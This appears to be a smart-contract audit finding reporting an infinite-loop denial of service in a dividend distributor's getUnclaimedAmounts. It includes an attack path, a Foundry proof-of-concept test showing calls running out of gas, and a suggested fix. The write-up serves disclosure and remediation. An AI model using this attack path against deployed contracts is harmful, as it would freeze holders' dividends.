# [000893] Any caller will brick dividend distribution for TVS holders
  
  ### Summary

*The non-advancing loop in `A26ZDividendDistributor.getUnclaimedAmounts` will cause a complete DoS of dividend setup and distribution for TVS holders as any caller will hit an infinite loop (OOG) when allocations contain either `claimedSeconds[i]==0` (default) or `claimedFlows[i]==true`, blocking `_setAmounts()`, `setUpTheDividends()`, and downstream claims.

### Root Cause

In `protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol:146-157` the loop in `getUnclaimedAmounts` uses `continue` before incrementing `i`, so `i` never advances when `claimedFlows[i]` is true or `claimedSeconds[i]==0`, causing an infinite loop and OOG.

### Internal Pre-conditions

1. Any NFT has at least one allocation flow (normal state after mint/claim setup) with `claimedSeconds` initially 0 or later `claimedFlows` set to true.
2. Owner or any caller triggers `getUnclaimedAmounts()` directly or indirectly via `_setAmounts()/setUpTheDividends()/setAmounts()`.

### External Pre-conditions

1. None beyond normal blockchain execution; no external protocol conditions required.

### Attack Path

1. Any user or the owner calls `getUnclaimedAmounts(nftId)` (or owner calls `setUpTheDividends()`/`setAmounts()` which call it internally).
2. The loop hits a flow where `claimedSeconds[i]==0` (default) or `claimedFlows[i]==true`.
3. Because `i` is not incremented before `continue`, the loop never progresses, runs until gas is exhausted, and the transaction reverts.
4. As a result, `_setAmounts()` and `_setDividends()` cannot complete, bricking dividend setup for all holders.

### Impact

TVS holders and the protocol cannot execute dividend setup or distribution; stablecoin reserves in the distributor become effectively stuck and no dividends can be allocated or claimed. This is a protocol-wide DoS with full feature loss (no attacker profit, pure griefing).

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IAlignerzVesting} from "../src/interfaces/IAlignerzVesting.sol";
import {IAlignerzNFT} from "../src/interfaces/IAlignerzNFT.sol";

/// @dev Minimal vesting stub to feed crafted allocation data
contract VestingStub is IAlignerzVesting {
    mapping(uint256 => Allocation) internal allocations;

    function seedAllocation(
        uint256 nftId,
        IERC20 token,
        uint256[] memory amounts,
        uint256[] memory claimedSeconds,
        uint256[] memory vestingPeriods,
        bool[] memory claimedFlows
    ) external {
        Allocation storage a = allocations[nftId];
        a.token = token;
        a.amounts = amounts;
        a.claimedSeconds = claimedSeconds;
        a.vestingPeriods = vestingPeriods;
        a.claimedFlows = claimedFlows;
    }

    function allocationOf(uint256 nftId) external view returns (Allocation memory) {
        return allocations[nftId];
    }
}

/// @dev Minimal NFT stub to satisfy distributor ownership checks
contract NFTStub is IAlignerzNFT {
    uint256 internal totalMinted;
    mapping(uint256 => address) internal ownerOf;

    function mint(address to) external returns (uint256) {
        uint256 tokenId = totalMinted;
        ownerOf[tokenId] = to;
        totalMinted++;
        return tokenId;
    }

    function extOwnerOf(uint256 tokenId) external view returns (address) {
        address owner = ownerOf[tokenId];
        require(owner != address(0), "nonexistent");
        return owner;
    }

    function burn(uint256 tokenId) external {
        ownerOf[tokenId] = address(0);
    }

    function getTotalMinted() external view returns (uint256) {
        return totalMinted;
    }
}

/// @notice Demonstrates the infinite loop / OOG in getUnclaimedAmounts
contract A26ZDividendDistributorUnclaimedDoSTest is Test {
    MockUSD internal stablecoin;
    MockUSD internal vestingToken;
    VestingStub internal vesting;
    NFTStub internal nft;
    A26ZDividendDistributor internal distributor;

    address internal user = address(0xBEEF);

    function setUp() public {
        stablecoin = new MockUSD();
        vestingToken = new MockUSD();
        vesting = new VestingStub();
        nft = new NFTStub();

        // Pass a token that does NOT match the vesting allocation token so the loop executes
        distributor = new A26ZDividendDistributor(
            address(vesting), address(nft), address(stablecoin), block.timestamp, 30 days, address(0xDEAD)
        );
    }

    function _mintAndSeed(
        bool claimedFlow,
        uint256 claimedSecondsValue
    ) internal returns (uint256 nftId) {
        nftId = nft.mint(user);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory claimedSeconds = new uint256[](1);
        uint256[] memory vestingPeriods = new uint256[](1);
        bool[] memory claimedFlows = new bool[](1);

        amounts[0] = 1e6;
        claimedSeconds[0] = claimedSecondsValue;
        vestingPeriods[0] = 30 days;
        claimedFlows[0] = claimedFlow;

        vesting.seedAllocation(nftId, IERC20(address(vestingToken)), amounts, claimedSeconds, vestingPeriods, claimedFlows);
    }

    function test_getUnclaimedAmounts_OOG_whenFlowMarkedClaimed() public {
        uint256 nftId = _mintAndSeed(true, 1);

        bytes memory data = abi.encodeWithSelector(distributor.getUnclaimedAmounts.selector, nftId);
        (bool ok,) = address(distributor).call{gas: 1_000_000}(data);

        assertFalse(ok, "getUnclaimedAmounts should exhaust gas when claimedFlows[i] is true");
    }

    function test_getUnclaimedAmounts_OOG_whenClaimedSecondsZero() public {
        uint256 nftId = _mintAndSeed(false, 0);

        bytes memory data = abi.encodeWithSelector(distributor.getUnclaimedAmounts.selector, nftId);
        (bool ok,) = address(distributor).call{gas: 1_000_000}(data);

        assertFalse(ok, "getUnclaimedAmounts should exhaust gas when claimedSeconds[i] is zero");
    }

    function test_setUpTheDividends_OOG_blocksOwnerFlow() public {
        _mintAndSeed(true, 1);
        stablecoin.transfer(address(distributor), 10e6);

        bytes memory data = abi.encodeWithSelector(distributor.setUpTheDividends.selector);
        (bool ok,) = address(distributor).call{gas: 2_000_000}(data);

        assertFalse(ok, "setUpTheDividends should fail/out of gas once any flow is claimed");
    }
}
```

The issue is reproduced by PoC above, which seeds allocations with `claimedSeconds==0` or `claimedFlows==true` and shows `getUnclaimedAmounts`/`setUpTheDividends` revert via OOG due to the infinite loop.

### Mitigation

Increment `i` on every iteration path in `getUnclaimedAmounts` (move `++i` to the end of the loop or increment before each `continue`) so the loop progresses for all branch conditions.
  